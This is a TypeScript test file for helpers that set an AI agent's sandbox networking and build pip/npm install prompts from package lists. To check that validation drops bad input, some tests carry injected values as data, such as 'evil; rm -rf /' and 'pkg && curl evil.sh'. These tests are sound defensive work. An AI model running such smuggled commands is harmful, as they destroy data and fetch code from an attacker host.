import { describe, expect, it } from 'vitest';
import type { RuntimeEnvironmentData } from '@ever-works/plugin';

import { buildPackageBootstrapPrompt, resolveEnvironmentNetworking } from './runtime-environment.js';

function makeEnvironment(overrides: Partial<RuntimeEnvironmentData> = {}): RuntimeEnvironmentData {
	return {
		id: 'env-1',
		name: 'Python Data',
		slug: 'python-data',
		pipPackages: [],
		npmPackages: [],
		networkingMode: 'unrestricted',
		allowedHosts: null,
		allowPackageManagers: true,
		...overrides
	};
}

describe('resolveEnvironmentNetworking', () => {
	it('returns undefined when no Environment resolved (env-var fallback stays in charge)', () => {
		expect(resolveEnvironmentNetworking(undefined)).toBeUndefined();
	});

	it('maps unrestricted mode to an explicit unrestricted config', () => {
		expect(resolveEnvironmentNetworking(makeEnvironment())).toEqual({ type: 'unrestricted' });
	});

	it('maps limited mode to the CMA limited shape with hosts + package-manager flag', () => {
		const networking = resolveEnvironmentNetworking(
			makeEnvironment({
				networkingMode: 'limited',
				allowedHosts: ['api.anthropic.com', '*.example.com'],
				allowPackageManagers: false
			})
		);
		expect(networking).toEqual({
			type: 'limited',
			allowed_hosts: ['api.anthropic.com', '*.example.com'],
			allow_package_managers: false
		});
	});

	it('drops invalid hosts instead of forwarding them (defense in depth)', () => {
		const networking = resolveEnvironmentNetworking(
			makeEnvironment({
				networkingMode: 'limited',
				allowedHosts: ['api.anthropic.com', 'https://evil.example', 'bad host']
			})
		);
		expect(networking).toEqual({
			type: 'limited',
			allowed_hosts: ['api.anthropic.com'],
			allow_package_managers: true
		});
	});
});

describe('buildPackageBootstrapPrompt', () => {
	it('returns null with no Environment or with empty package lists', () => {
		expect(buildPackageBootstrapPrompt(undefined)).toBeNull();
		expect(buildPackageBootstrapPrompt(makeEnvironment())).toBeNull();
	});

	it('composes pip and npm install commands from validated specs', () => {
		const prompt = buildPackageBootstrapPrompt(
			makeEnvironment({
				pipPackages: ['pandas==2.2.0', 'requests'],
				npmPackages: ['typescript', '@types/node@^22']
			})
		);
		expect(prompt).toContain("- `pip install 'pandas==2.2.0' 'requests'`");
		expect(prompt).toContain("- `npm install -g 'typescript' '@types/node@^22'`");
		expect(prompt).toContain('Python Data');
	});

	it('silently drops specs that fail re-validation', () => {
		const prompt = buildPackageBootstrapPrompt(
			makeEnvironment({
				pipPackages: ['requests', 'evil; rm -rf /'],
				npmPackages: ['pkg && curl evil.sh']
			})
		);
		expect(prompt).toContain("- `pip install 'requests'`");
		expect(prompt).not.toContain('rm -rf');
		expect(prompt).not.toContain('npm install');
	});

	it('returns null when every spec fails re-validation', () => {
		expect(
			buildPackageBootstrapPrompt(
				makeEnvironment({ pipPackages: ['bad;spec'], npmPackages: ['also bad'] })
			)
		).toBeNull();
	});
});
